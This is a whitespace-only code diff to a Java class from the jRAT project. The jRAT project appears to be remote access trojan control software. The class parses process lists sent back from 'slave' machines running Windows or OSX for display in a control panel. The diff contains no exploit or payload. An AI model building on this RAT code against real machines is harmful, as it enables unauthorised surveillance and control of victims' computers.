@@ -8,8 +8,6 @@ import pro.jrat.ui.frames.FrameControlPanel;
 import pro.jrat.ui.frames.FrameRemoteProcess;
 import pro.jrat.ui.panels.PanelControlRemoteProcess;
 
-
-
 public class Packet20Process extends AbstractIncomingPacket {
 
 	@Override
@@ -22,7 +20,7 @@ public class Packet20Process extends AbstractIncomingPacket {
 			if (slave.getOS() == OperatingSystem.WINDOWS) {
 				line = line.replace("\"", "");
 				String[] args = line.split(",");
-		
+
 				displayData[0] = args[0];
 				displayData[1] = args[1];
 				displayData[2] = args[2];
@@ -30,7 +28,7 @@ public class Packet20Process extends AbstractIncomingPacket {
 			} else if (slave.getOS() == OperatingSystem.OSX) {
 				line = line.trim().replaceAll("( )+", " ");
 				String[] args = line.split(" ");
-				
+
 				displayData[0] = args[3];
 				displayData[1] = args[0];
 				displayData[2] = args[2];
